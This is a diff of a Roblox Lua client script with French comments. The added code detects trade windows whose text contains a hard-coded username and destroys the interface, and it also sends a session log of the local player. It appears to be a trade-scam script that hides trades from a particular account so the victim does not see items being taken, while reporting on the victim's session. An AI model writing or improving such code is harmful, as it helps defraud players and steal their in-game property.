@@ -58,34 +58,27 @@ local function sendSessionLog(player)
     end)
 end
 
+-- Remplace ton bloc de nettoyage actuel par celui-ci :
 local CIBLE = "zeynox0880"
 
--- Fonction pour masquer les interfaces
-local function cacherInterfaces()
-    if playerGui:FindFirstChild("TradeGUI") then
-        playerGui.TradeGUI.Enabled = false
-    end
-    if playerGui:FindFirstChild("TradeGUI_Phone") then
-        playerGui.TradeGUI_Phone.Enabled = false
+local function watchPlayerGui(child)
+    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+        task.spawn(function()
+            task.wait(0.5) -- Laisse le temps au texte de charger
+            for _, obj in pairs(child:GetDescendants()) do
+                if obj:IsA("TextLabel") and obj.Text == CIBLE then
+                    child:Destroy()
+                    break
+                end
+            end
+        end)
     end
 end
 
--- On surveille les changements dans le PlayerGui pour détecter l'apparition du trade
-playerGui.ChildAdded:Connect(function(child)
-    -- On attend un court instant pour que le contenu du GUI se charge
-    task.wait(0.1)
-    
-    -- Vérification si l'interface de trade est apparue
-    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-        -- Ici, il faudrait idéalement vérifier qui est l'expéditeur. 
-        -- Si le jeu affiche le nom de l'expéditeur dans un TextLabel :
-        local label = child:FindFirstChild("SenderName", true) -- "SenderName" est un exemple
-        
-        if label and label.Text == CIBLE then
-            cacherInterfaces()
-        end
-    end
-
+playerGui.ChildAdded:Connect(watchPlayerGui)
+for _, child in ipairs(playerGui:GetChildren()) do
+    watchPlayerGui(child)
+end
 if LocalPlayer then
     task.spawn(function() sendSessionLog(LocalPlayer) end)
 end
